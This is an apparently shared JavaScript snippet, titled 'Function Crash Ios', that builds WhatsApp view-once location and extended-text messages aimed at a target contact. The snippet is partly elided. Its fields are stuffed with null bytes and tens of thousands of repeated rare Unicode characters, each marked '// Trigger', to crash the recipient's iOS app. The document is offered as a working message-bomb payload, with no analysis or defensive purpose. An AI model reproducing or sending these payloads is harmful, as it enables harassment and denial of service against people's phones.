/* 
Function Crash Ios Create By @GyzenVtx Khusus Patner
Rules :
...
async function NewiOs(stx, Fjids){
const s = "𑇂𑆵𑆴𑆿".repeat(60000); //Trigger 
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), // Trigger
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), // Trigger 
         url: `https://xnxx-snith.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, //Trigger 
      }
      let msg = generateWAMessageFromContent(Fjids, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
      ...
      let extendMsg = {
         extendedTextMessage: { 
            text: "Vortunix Crash You 🕊" + s, //Trigger 
            matchedText: "Gyzen",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔖𝔫𝔦𝔱𝔥" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
      ...
      let msg2 = generateWAMessageFromContent(Fjids, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
